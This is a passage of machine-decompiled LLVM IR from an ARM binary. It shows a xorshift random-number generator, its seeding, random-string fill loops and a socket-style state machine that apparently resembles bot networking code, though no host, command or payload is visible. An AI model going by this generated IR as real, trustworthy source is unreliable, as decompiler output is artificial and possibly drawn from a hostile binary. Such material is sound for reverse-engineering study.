  %v0_deec = load i32, i32* @r4, align 4
  store i32 %v0_deec, i32* %r2.global-to-local, align 4
  %v2_def4 = call i32 @function_11140(i32 %v3_ded8, i32 3)
  %v1_defc = or i32 %v2_def4, 2048
  store i32 %v1_defc, i32* %r2.global-to-local, align 4
  %v0_df00 = load i32, i32* @r5, align 4
  %v2_df04 = call i32 @function_11140(i32 %v0_df00, i32 4)
  %v2_df0c = load i32, i32* inttoptr (i32 127116 to i32*), align 4
  store i32 %v2_df0c, i32* %r3.global-to-local, align 4
  %v2_df10 = icmp eq i32 %v2_df0c, 0
  br i1 %v2_df10, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_deec
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_deec, %bb42
  %v2_df18 = xor i1 %v2_df10, true
  call void @__pseudo_cond_branch(i1 %v2_df18, i32 %v2_df0c)
  store i32 ptrtoint (i8** @global_var_1f25c.94 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_df24 = load i32, i32* %r8.global-to-local, align 4
  %v1_df24 = inttoptr i32 %v0_df24 to i32*
  %v2_df24 = load i32, i32* %v1_df24, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1f25c.94 to i8*), align 4
  %v4_df34 = call i32 @function_118d4(i32 %v2_df24, i32 ptrtoint (i16** @global_var_212e4.76 to i32), i32 16)
  br label %dec_label_pc_dc4c

dec_label_pc_df3c:                                ; preds = %dec_label_pc_dd14
  store i32 4, i32* @r5, align 4
  store i32 %v2_df48, i32* %r3.global-to-local, align 4
  store i32 %v2_df4c, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_df64 = call i32 @function_11944(i32 %v2_dd9c, i32 1, i32 4, i32 %v2_df48, i32 %v2_df4c)
  %v3_df68 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_df68, i32* %r3.global-to-local, align 4
  %v2_df6c = icmp eq i32 %v3_df68, 0
  br i1 %v2_df6c, label %dec_label_pc_e000, label %dec_label_pc_df74

dec_label_pc_df74:                                ; preds = %dec_label_pc_df3c
  %v0_df74 = load i32, i32* @r4, align 4
  %v1_df74 = inttoptr i32 %v0_df74 to i32*
  %v2_df74 = load i32, i32* %v1_df74, align 4
  %v1_df78 = call i32 @function_1130c(i32 %v2_df74)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_df80 = load i32, i32* @r4, align 4
  %v2_df80 = inttoptr i32 %v1_df80 to i32*
  store i32 -1, i32* %v2_df80, align 4
  %v0_df84 = call i32 @function_e0d0()
  %v3_df8c = zext i32 %v0_df84 to i64
  %v4_df8c = mul nuw i64 %v3_df8c, 3435973837
  %v3_df901 = udiv i64 %v4_df8c, 34359738368
  %v3_df943 = mul nuw nsw i64 %v3_df901, 8
  %v3_df94 = trunc i64 %v3_df943 to i32
  store i32 %v3_df94, i32* %r2.global-to-local, align 4
  %v2_df985 = mul nuw nsw i64 %v3_df901, 2
  %v2_df98 = trunc i64 %v2_df985 to i32
  %v2_df9c = add i32 %v3_df94, %v2_df98
  store i32 %v2_df9c, i32* %r3.global-to-local, align 4
  %v2_dfa0 = sub i32 %v0_df84, %v2_df9c
  %v1_dfa4 = add i32 %v2_dfa0, 1
  %v1_dfa8 = call i32 @function_133f8(i32 %v1_dfa4)
  br label %dec_label_pc_dbcc

dec_label_pc_dfb0:                                ; preds = %dec_label_pc_dcd8
  %v0_dfb4 = load i32, i32* @sl, align 4
  %v1_dfb4 = inttoptr i32 %v0_dfb4 to i32*
  %v2_dfb4 = load i32, i32* %v1_dfb4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_dfc4 = call i32 @function_11a30(i32 %v2_dfb4, i32 %v2_dfb8, i32 2, i32 16384)
  br label %dec_label_pc_dd04

dec_label_pc_dfcc:                                ; preds = %dec_label_pc_de40, %dec_label_pc_ddd4
  %v0_dfcc = load i32, i32* @r5, align 4
  %v1_dfcc = inttoptr i32 %v0_dfcc to i32*
  %v2_dfcc = load i32, i32* %v1_dfcc, align 4
  store i32 %v2_dfcc, i32* %r3.global-to-local, align 4
  %v7_dfd0 = icmp eq i32 %v2_dfcc, 4
  br i1 %v7_dfd0, label %dec_label_pc_dbcc, label %bb44

bb44:                                             ; preds = %dec_label_pc_dfcc
  %v8_dfd4 = icmp eq i32 %v2_dfcc, 11
  br i1 %v8_dfd4, label %dec_label_pc_dbcc, label %dec_label_pc_dfdc

dec_label_pc_dfdc:                                ; preds = %bb44, %dec_label_pc_de60, %dec_label_pc_de0c
  %v0_dfdc = load i32, i32* @sl, align 4
  %v1_dfdc = inttoptr i32 %v0_dfdc to i32*
  %v2_dfdc = load i32, i32* %v1_dfdc, align 4
  store i32 57320, i32* @lr, align 4
  %v1_dfe4 = icmp ne i32 %v2_dfdc, -1
  call void @__pseudo_cond_branch(i1 %v1_dfe4, i32 ptrtoint (i32* @global_var_1130c.96 to i32))
  store i32 127112, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* inttoptr (i32 127112 to i32*), align 8
  %v1_dff8 = call i32 @function_133f8(i32 1)
  br label %dec_label_pc_dbcc

dec_label_pc_e000:                                ; preds = %dec_label_pc_df3c
  %v2_e008 = call i32 @function_1084c(i8* %v1_e008)
  %sext = mul i32 %v2_e008, 16777216
  %v1_e00c = sdiv i32 %sext, 16777216
  %v7_e00c = inttoptr i32 %v1_e00c to i8*
  store i8* %v7_e00c, i8** %stack_var_-42, align 4
  %v0_e010 = call i32 @function_10b08()
  store i32 %v0_e010, i32* @global_var_212d8.45, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e024 = load i32, i32* @r5, align 4
  store i32 %v0_e024, i32* %r2.global-to-local, align 4
  %v0_e028 = load i32, i32* @r4, align 4
  %v1_e028 = inttoptr i32 %v0_e028 to i32*
  %v2_e028 = load i32, i32* %v1_e028, align 4
  %v4_e02c = call i32 @function_11a30(i32 %v2_e028, i32 ptrtoint (i32* @global_var_166ac.99 to i32), i32 %v0_e024, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_e038 = load i32, i32* @r4, align 4
  %v1_e038 = inttoptr i32 %v0_e038 to i32*
  %v2_e038 = load i32, i32* %v1_e038, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e044 = call i32 @function_11a30(i32 %v2_e038, i32 %v2_dfb8, i32 1, i32 16384)
  %v3_e048 = load i8*, i8** %stack_var_-42, align 4
  %v4_e048 = ptrtoint i8* %v3_e048 to i32
  store i32 %v4_e048, i32* %r2.global-to-local, align 4
  %v3_e04c = icmp eq i8* %v3_e048, null
  br i1 %v3_e04c, label %dec_label_pc_dbcc, label %dec_label_pc_e054

dec_label_pc_e054:                                ; preds = %dec_label_pc_e000
  %v0_e058 = load i32, i32* @r4, align 4
  %v1_e058 = inttoptr i32 %v0_e058 to i32*
  %v2_e058 = load i32, i32* %v1_e058, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e064 = call i32 @function_11a30(i32 %v2_e058, i32 %v2_da08, i32 %v4_e048, i32 16384)
  br label %dec_label_pc_dbcc

dec_label_pc_e06c:                                ; preds = %dec_label_pc_de14
  %v0_e070 = load i32, i32* @r8, align 4
  %v1_e070 = inttoptr i32 %v0_e070 to i32*
  %v2_e070 = load i32, i32* %v1_e070, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_e07c = add i32 %v4_de18, 16384
  store i32 %v1_e07c, i32* %r3.global-to-local, align 4
  %v4_e080 = call i32 @function_119bc(i32 %v2_e070, i32 %v2_dfb8, i32 2, i32 %v1_e07c)
  br label %dec_label_pc_dbcc

dec_label_pc_e088:                                ; preds = %dec_label_pc_de24
  %v0_e088 = load i32, i32* @r8, align 4
  %v1_e088 = inttoptr i32 %v0_e088 to i32*
  %v2_e088 = load i32, i32* %v1_e088, align 4
  %v1_e08c = call i32 @function_1130c(i32 %v2_e088)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e094 = load i32, i32* @r8, align 4
  %v2_e094 = inttoptr i32 %v1_e094 to i32*
  store i32 -1, i32* %v2_e094, align 4
  br label %dec_label_pc_dbcc

; uselistorder directives
  uselistorder i32 %v3_ded8, { 3, 2, 1, 0 }
  uselistorder i8* %v3_deb4, { 1, 0 }
  uselistorder i32 %v5_de90, { 1, 0, 2, 3 }
  uselistorder i32 %v4_de84, { 1, 0 }
  uselistorder i32 %v7_de54, { 1, 0 }
  uselistorder i32 %v5_de2c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_de18, { 2, 0, 1, 3 }
  uselistorder i32 %v4_de00, { 1, 0 }
  uselistorder i32 %v2_dd9c, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v5_dce0, { 1, 0, 2 }
  uselistorder i32 %v2_dcdc, { 2, 0, 1 }
  uselistorder i32 %v5_dcc4, { 1, 2, 0 }
  uselistorder i32 %v2_dc08, { 2, 1, 0 }
  uselistorder i32 %v1_dbfc, { 1, 2, 0 }
  uselistorder i32 %v1_dbe0, { 1, 2, 0 }
  uselistorder i32 %v2_dfb8, { 2, 0, 4, 3, 1 }
  uselistorder i32 %v2_dcf0, { 3, 2, 1, 0 }
  uselistorder i32 %v2_dbc8, { 1, 0, 2 }
  uselistorder i32 %v2_da64, { 0, 10, 1, 11, 2, 9, 3, 4, 8, 7, 5, 12, 6 }
  uselistorder i32 %v2_da4c, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_d974, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 9 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i8** @global_var_1f25c.94 to i32), { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1f25c.94 to i8*), { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_d878, { 1, 0 }
  uselistorder i32 (i32)* @function_ced0, { 1, 0 }
  uselistorder i32 (i32)* @function_85e0, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_e194, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_d694, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_d7f4.68 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_212e4.76 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @function_11b98, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_dd04, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_dc4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dc3c, { 1, 0 }
  uselistorder label %dec_label_pc_dbcc, { 7, 8, 9, 1, 10, 2, 0, 11, 12, 3, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_da1c, { 2, 0, 1 }
}

define i32 @function_e0b8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e0b8:
  %cpsr_c.global-to-local = alloca i1, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v0_e0b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0b8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e0b8
  %v2_e0b8 = load i32, i32* @r4, align 4
  %v3_e0b8 = icmp slt i32 %v2_e0b8, 0
  store i1 %v3_e0b8, i1* %cpsr_c.global-to-local, align 1
  %v4_e0b8 = mul i32 %v2_e0b8, 2
  %v5_e0b8 = and i32 %v4_e0b8, %arg1
  call void @__pseudo_branch(i32 %v5_e0b8)
  %v0_e0bc.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0bc.pr, label %.thread, label %.thread1

.thread:                                          ; preds = %bb
  %v2_e0bc = load i32, i32* @r8, align 4
  %v3_e0bc = icmp slt i32 %v2_e0bc, 0
  store i1 %v3_e0bc, i1* %cpsr_c.global-to-local, align 1
  %v4_e0bc = mul i32 %v2_e0bc, 2
  %v5_e0bc = and i32 %v4_e0bc, %arg1
  call void @__pseudo_branch(i32 %v5_e0bc)
  %v0_e0c0.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0c0.pr.pr, label %bb2, label %.thread1

bb2:                                              ; preds = %.thread
  %v2_e0c0 = load i32, i32* @ip, align 4
  %v4_e0c0 = add i32 %arg2, -1
  %v5_e0c0 = shl i32 1, %v4_e0c0
  %v6_e0c0 = and i32 %v2_e0c0, %v5_e0c0
  %v7_e0c0 = icmp ne i32 %v6_e0c0, 0
  store i1 %v7_e0c0, i1* %cpsr_c.global-to-local, align 1
  %v8_e0c0 = ashr i32 %v2_e0c0, %arg2
  %v9_e0c0 = and i32 %v8_e0c0, %arg1
  call void @__pseudo_branch(i32 %v9_e0c0)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e0b8, %bb, %.thread, %bb2
  %v0_e0c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v0_e0c4, i32 -22312072)
  %v0_e0cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0cc, label %bb3, label %bb4

bb3:                                              ; preds = %.thread1
  %v2_e0cc = load i32, i32* @ip, align 4
  %v3_e0cc = and i32 %v2_e0cc, 4096
  %v4_e0cc = icmp ne i32 %v3_e0cc, 0
  store i1 %v4_e0cc, i1* %cpsr_c.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %.thread1, %bb3
  %v7_e0cc = load i32, i32* @r0, align 4
  ret i32 %v7_e0cc

; uselistorder directives
  uselistorder i32 %v2_e0c0, { 1, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_e0d0() local_unnamed_addr {
dec_label_pc_e0d0:
  %v2_e0dc = load i32, i32* @global_var_1f260.101, align 4
  %v2_e0e0 = load i32, i32* @global_var_1f26c.103, align 4
  %v4_e0ec = mul i32 %v2_e0dc, 2048
  %v5_e0ec = xor i32 %v4_e0ec, %v2_e0dc
  store i32 %v5_e0ec, i32* @r3, align 4
  %v4_e0f0 = udiv i32 %v2_e0e0, 524288
  %v5_e0f0 = xor i32 %v4_e0f0, %v2_e0e0
  %v2_e0f4 = load i32, i32* @global_var_1f264.105, align 4
  %v2_e0f8 = load i32, i32* @global_var_1f268.107, align 4
  store i32 %v2_e0f8, i32* @ip, align 4
  %v2_e0fc = xor i32 %v5_e0f0, %v5_e0ec
  %v4_e100 = udiv i32 %v5_e0ec, 256
  %v5_e100 = xor i32 %v2_e0fc, %v4_e100
  store i32 %v2_e0f4, i32* @global_var_1f260.101, align 4
  store i32 %v2_e0f8, i32* @global_var_1f264.105, align 4
  store i32 %v2_e0e0, i32* @global_var_1f268.107, align 4
  store i32 %v5_e100, i32* @global_var_1f26c.103, align 4
  ret i32 %v5_e100

; uselistorder directives
  uselistorder i32 %v2_e0e0, { 2, 1, 0 }
  uselistorder i32 %v2_e0dc, { 1, 0 }
}

define i32 @function_e12c(i32 %arg1) local_unnamed_addr {
dec_label_pc_e12c:
  %v2_e138 = call i32 @function_10f8c(i32* null)
  store i32 %v2_e138, i32* @r0, align 4
  store i32 %v2_e138, i32* @global_var_1f260.101, align 4
  %v0_e144 = call i32 @function_10f78()
  store i32 %v0_e144, i32* @r0, align 4
  %v0_e14c = call i32 @function_10ed0()
  %v2_e154 = xor i32 %v0_e144, %v0_e14c
  store i32 %v2_e154, i32* @global_var_1f264.105, align 4
  %v1_e15c = call i32 @function_11750(i32 %v2_e154)
  %v2_e160 = load i32, i32* @global_var_1f264.105, align 4
  %v2_e16c = xor i32 %v2_e160, %v1_e15c
  store i32 %v2_e16c, i32* @global_var_1f26c.103, align 4
  store i32 %v1_e15c, i32* @global_var_1f268.107, align 4
  ret i32 %v1_e15c

; uselistorder directives
  uselistorder i32 %v1_e15c, { 1, 2, 0 }
  uselistorder i32 ()* @function_10ed0, { 2, 1, 0 }
}

define i32 @function_e194(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e194:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e194 = load i32, i32* @r4, align 4
  %v6_e194 = load i32, i32* @r5, align 4
  %v9_e194 = load i32, i32* @r6, align 4
  %v12_e194 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e1a8 = call i32 @function_1030c(i32 28)
  %v3_e1b4 = call i32 @function_10248(i32 28, i32* null)
  store i32 %v3_e1b4, i32* @r1, align 4
  %v2_e1c0 = bitcast i32* %stack_var_-72 to i8*
  %v3_e1c0 = call i32 @function_11850(i8* %v2_e1c0, i32 %v3_e1b4)
  %v2_e1c4 = icmp eq i32 %arg2, 0
  br i1 %v2_e1c4, label %dec_label_pc_e240, label %dec_label_pc_e1cc

dec_label_pc_e1cc:                                ; preds = %dec_label_pc_e194
  store i32 ptrtoint (i32* @global_var_1f260.101 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f264.105 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f268.107 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1f26c.103 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e224 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e1e0

dec_label_pc_e1e0:                                ; preds = %dec_label_pc_e1e0.dec_label_pc_e1e0_crit_edge, %dec_label_pc_e1cc
  %v1_e204 = phi i32 [ %v1_e204.pre, %dec_label_pc_e1e0.dec_label_pc_e1e0_crit_edge ], [ ptrtoint (i32* @global_var_1f260.101 to i32), %dec_label_pc_e1cc ]
  %v2_e1e0 = load i32, i32* @global_var_1f26c.103, align 4
  store i32 %v2_e1e0, i32* %r2.global-to-local, align 4
  %v2_e1e4 = load i32, i32* @global_var_1f260.101, align 4
  %v4_e1e8 = udiv i32 %v2_e1e0, 524288
  %v5_e1e8 = xor i32 %v4_e1e8, %v2_e1e0
  %v4_e1ec = mul i32 %v2_e1e4, 2048
  %v5_e1ec = xor i32 %v4_e1ec, %v2_e1e4
  %v2_e1f0 = xor i32 %v5_e1e8, %v5_e1ec
  %v2_e1f4 = load i32, i32* @global_var_1f264.105, align 4
  %v2_e1f8 = load i32, i32* @global_var_1f268.107, align 4
  store i32 %v2_e1f8, i32* %ip.global-to-local, align 4
  %v4_e1fc = udiv i32 %v5_e1ec, 256
  %v5_e1fc = xor i32 %v2_e1f0, %v4_e1fc
  store i32 %v5_e1fc, i32* @r4, align 4
  %v2_e204 = inttoptr i32 %v1_e204 to i32*
  store i32 %v2_e1f4, i32* %v2_e204, align 4
  %v0_e208 = load i32, i32* %ip.global-to-local, align 4
  %v1_e208 = load i32, i32* %r8.global-to-local, align 4
  %v2_e208 = inttoptr i32 %v1_e208 to i32*
  store i32 %v0_e208, i32* %v2_e208, align 4
  %v0_e20c = load i32, i32* %r2.global-to-local, align 4
  %v1_e20c = load i32, i32* @r7, align 4
  %v2_e20c = inttoptr i32 %v1_e20c to i32*
  store i32 %v0_e20c, i32* %v2_e20c, align 4
  %v0_e210 = load i32, i32* @r4, align 4
  %v1_e210 = load i32, i32* @r6, align 4
  %v2_e210 = inttoptr i32 %v1_e210 to i32*
  store i32 %v0_e210, i32* %v2_e210, align 4
  %v2_e214 = call i32 @function_1084c(i8* %v2_e1c0)
  %v0_e21c = load i32, i32* @r4, align 4
  %v2_e220 = call i32 @function_10ea4(i32 %v0_e21c, i32 %v2_e214)
  %v2_e228 = add i32 %v2_e214, %v2_e224
  %v1_e22c = add i32 %v2_e228, -32
  %v2_e22c = inttoptr i32 %v1_e22c to i8*
  %v3_e22c = load i8, i8* %v2_e22c, align 1
  %v2_e230 = load i32, i32* @r5, align 4
  %v3_e230 = load i32, i32* %fp.global-to-local, align 4
  %v4_e230 = add i32 %v3_e230, %v2_e230
  %v5_e230 = inttoptr i32 %v4_e230 to i8*
  store i8 %v3_e22c, i8* %v5_e230, align 1
  %v0_e234 = load i32, i32* @r5, align 4
  %v1_e234 = add i32 %v0_e234, 1
  store i32 %v1_e234, i32* @r5, align 4
  %v1_e238 = load i32, i32* %sb.global-to-local, align 4
  %v9_e238 = icmp eq i32 %v1_e234, %v1_e238
  br i1 %v9_e238, label %dec_label_pc_e240, label %dec_label_pc_e1e0.dec_label_pc_e1e0_crit_edge

dec_label_pc_e1e0.dec_label_pc_e1e0_crit_edge:    ; preds = %dec_label_pc_e1e0
  %v1_e204.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e1e0

dec_label_pc_e240:                                ; preds = %dec_label_pc_e1e0, %dec_label_pc_e194
  %v1_e244 = call i32 @function_1026c(i32 28)
  store i32 %v3_e194, i32* @r4, align 4
  store i32 %v6_e194, i32* @r5, align 4
  store i32 %v9_e194, i32* @r6, align 4
  store i32 %v12_e194, i32* @r7, align 4
  ret i32 %v1_e244

; uselistorder directives
  uselistorder i32 %v2_e1e4, { 1, 0 }
  uselistorder i32 %v2_e1e0, { 1, 0, 2 }
}

define i32 @function_e264(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e264:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e264 = load i32, i32* %r1.global-to-local, align 4
  %v3_e268 = load i32, i32* @r4, align 4
  store i32 %v3_e268, i32* %stack_var_-28, align 4
  %v0_e26c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e26c, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e264, 1
  br i1 %tmp16, label %dec_label_pc_e314, label %dec_label_pc_e274

dec_label_pc_e274:                                ; preds = %dec_label_pc_e264
  store i32 ptrtoint (i32* @global_var_1f26c.103 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f268.107 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f264.105 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f260.101 to i32), i32* %r6.global-to-local, align 4
  %v2_e284 = load i32, i32* @global_var_1f26c.103, align 4
  store i32 %v2_e284, i32* %lr.global-to-local, align 4
  %v2_e288 = load i32, i32* @global_var_1f268.107, align 4
  store i32 %v2_e288, i32* %r4.global-to-local, align 4
  %v2_e28c = load i32, i32* @global_var_1f264.105, align 4
  store i32 %v2_e28c, i32* %r0.global-to-local, align 4
  %v2_e290 = load i32, i32* @global_var_1f260.101, align 4
  br label %dec_label_pc_e2b4

dec_label_pc_e298:                                ; preds = %dec_label_pc_e2d4
  %v1_e298 = trunc i32 %v5_e2c4 to i16
  %v3_e298 = inttoptr i32 %v9_e2c8 to i16*
  store i16 %v1_e298, i16* %v3_e298, align 2
  %v4_e298 = load i32, i32* %r5.global-to-local, align 4
  %v5_e298 = add i32 %v4_e298, -2
  store i32 %v5_e298, i32* %r5.global-to-local, align 4
  %v0_e29c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e29c

dec_label_pc_e29c:                                ; preds = %.thread, %dec_label_pc_e298
  %v0_e29c = phi i32 [ %v9_e2cc, %.thread ], [ %v0_e29c.pre, %dec_label_pc_e298 ]
  %v2_e2985 = phi i32 [ %v12_e2c8, %.thread ], [ %v5_e298, %dec_label_pc_e298 ]
  %tmp17 = icmp slt i32 %v0_e29c, 1
  br i1 %tmp17, label %dec_label_pc_e31c, label %dec_label_pc_e2a8

dec_label_pc_e2a8:                                ; preds = %dec_label_pc_e29c
  %v0_e2a0 = load i32, i32* %r0.global-to-local, align 4
  %v0_e2a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e2a8, i32* %r0.global-to-local, align 4
  %v0_e2ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e2ac, i32* %r4.global-to-local, align 4
  %v0_e2b0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e2b0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e2b4

dec_label_pc_e2b4:                                ; preds = %dec_label_pc_e274, %dec_label_pc_e2a8
  %v0_e300 = phi i32 [ %v2_e28c, %dec_label_pc_e274 ], [ %v0_e2a8, %dec_label_pc_e2a8 ]
  %v9_e2c8 = phi i32 [ %v0_e26c, %dec_label_pc_e274 ], [ %v2_e2985, %dec_label_pc_e2a8 ]
  %v0_e2e0 = phi i32 [ %v0_e264, %dec_label_pc_e274 ], [ %v0_e29c, %dec_label_pc_e2a8 ]
  %v0_e2f4 = phi i32 [ %v2_e284, %dec_label_pc_e274 ], [ %v0_e2b0, %dec_label_pc_e2a8 ]
  %v0_e2f0 = phi i32 [ %v2_e290, %dec_label_pc_e274 ], [ %v0_e2a0, %dec_label_pc_e2a8 ]
  %v4_e2b4 = mul i32 %v0_e2f0, 2048
  %v5_e2b4 = xor i32 %v4_e2b4, %v0_e2f0
  %v4_e2b8 = udiv i32 %v0_e2f4, 524288
  %v5_e2b8 = xor i32 %v4_e2b8, %v0_e2f4
  %v2_e2bc = xor i32 %v5_e2b8, %v5_e2b4
  %v4_e2c4 = udiv i32 %v5_e2b4, 256
  %v5_e2c4 = xor i32 %v2_e2bc, %v4_e2c4
  store i32 %v5_e2c4, i32* %r3.global-to-local, align 4
  %v7_e2c8 = icmp sgt i32 %v0_e2e0, 3
  br i1 %v7_e2c8, label %.thread, label %dec_label_pc_e2d4

.thread:                                          ; preds = %dec_label_pc_e2b4
  %v10_e2c8 = inttoptr i32 %v9_e2c8 to i32*
  store i32 %v5_e2c4, i32* %v10_e2c8, align 4
  %v11_e2c8 = load i32, i32* %r5.global-to-local, align 4
  %v12_e2c8 = add i32 %v11_e2c8, 4
  store i32 %v12_e2c8, i32* %r5.global-to-local, align 4
  %v8_e2cc = load i32, i32* %r1.global-to-local, align 4
  %v9_e2cc = add i32 %v8_e2cc, -4
  store i32 %v9_e2cc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e29c

dec_label_pc_e2d4:                                ; preds = %dec_label_pc_e2b4
  %v7_e2e0 = icmp eq i32 %v0_e2e0, 1
  store i32 %v5_e2c4, i32* %r3.global-to-local, align 4
  %v1_e2e8 = add i32 %v0_e2e0, -2
  store i32 %v1_e2e8, i32* %r1.global-to-local, align 4
  br i1 %v7_e2e0, label %dec_label_pc_e2f0, label %dec_label_pc_e298

dec_label_pc_e2f0:                                ; preds = %dec_label_pc_e2d4
  store i32 %v5_e2c4, i32* %r3.global-to-local, align 4
  %v1_e300 = load i32, i32* %r6.global-to-local, align 4
  %v2_e300 = inttoptr i32 %v1_e300 to i32*
  store i32 %v0_e300, i32* %v2_e300, align 4
  %v0_e304 = load i32, i32* %r4.global-to-local, align 4
  %v1_e304 = load i32, i32* %r7.global-to-local, align 4
  %v2_e304 = inttoptr i32 %v1_e304 to i32*
  store i32 %v0_e304, i32* %v2_e304, align 4
  %v0_e308 = load i32, i32* %lr.global-to-local, align 4
  %v1_e308 = load i32, i32* %r8.global-to-local, align 4
  %v2_e308 = inttoptr i32 %v1_e308 to i32*
  store i32 %v0_e308, i32* %v2_e308, align 4
  %v0_e30c = load i32, i32* %r3.global-to-local, align 4
  %v1_e30c = load i32, i32* %sl.global-to-local, align 4
  %v2_e30c = inttoptr i32 %v1_e30c to i32*
  store i32 %v0_e30c, i32* %v2_e30c, align 4
  %v0_e310 = load i32, i32* %r3.global-to-local, align 4
  %v1_e310 = trunc i32 %v0_e310 to i8
  %v2_e310 = load i32, i32* %r5.global-to-local, align 4
  %v3_e310 = inttoptr i32 %v2_e310 to i8*
  store i8 %v1_e310, i8* %v3_e310, align 1
  br label %dec_label_pc_e314

dec_label_pc_e314:                                ; preds = %dec_label_pc_e264, %dec_label_pc_e31c, %dec_label_pc_e2f0
  %v2_e314 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e314, i32* @r4, align 4
  %v1_e318 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e318

dec_label_pc_e31c:                                ; preds = %dec_label_pc_e29c
